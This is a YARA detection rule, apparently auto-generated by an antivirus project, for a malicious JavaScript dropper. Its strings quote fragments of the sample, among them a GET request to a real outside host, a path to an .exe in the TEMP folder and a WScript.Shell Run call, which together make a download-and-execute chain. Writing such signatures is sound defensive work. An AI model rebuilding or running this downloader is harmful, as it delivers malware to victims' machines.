rule sig_20160329_0143c2950cbd58ba89fb9ccf05fdaa89 {
  meta:
    description = "datamaliciousorder - file 20160329_0143c2950cbd58ba89fb9ccf05fdaa89.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "38a5ed6dae77f6f650de56dae5f8aa3155418b634f074461da5d89af9619bc17"

  strings:
    $s1  = "Hx[U](\"GET\", \"http://shippedmedicalsupplies.com/n5ids\", false);" fullword ascii
    $s2  = "function rD() {return Bm[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"QwnHXDVEtCUVL.exe\";};" fullword ascii
    $s3  = "for (;;){WScript[t0](C() * 11); if (Hx[\"readystate\"] >= 2 * 2) break;};" fullword ascii
    $s4  = "var Bm = function H() {return WScript[V](\"WScript.Shell\");}(), Yk = 11;" fullword ascii
    $s5  = "function j(Fn, e0){K = K * 1; return Fn - e0;};" fullword ascii
    $s6  = "function sG(){return \"\" + f0;};" fullword ascii
    $s7  = "function q(VQ){Bm[\"Run\"](VQ, K, K);};" fullword ascii
    $s8  = "function S() {return ((N0 == true) && (N0 == yt)) ? 1 : K;};" fullword ascii
    $s9  = "var d = new this[\"Date\"]();" fullword ascii
    $s10 = "function gV(BC) {var f = (1, 2, 3, 4, 5, BC); return f;};" fullword ascii
    $s11 = "function C(){return 22;};" fullword ascii
    $s12 = "return j(R, p);" fullword ascii
    $s13 = "function wJ()" fullword ascii
    $s14 = " while (m){" fullword ascii
    $s15 = "function X(){return V;};" fullword ascii
    $s16 = "N0 = true; " fullword ascii
    $s17 = "var yt = false;" fullword ascii
    $s18 = "var qN = false;" fullword ascii
    $s19 = "var N0 = false;" fullword ascii
    $s20 = "yt = true; " fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}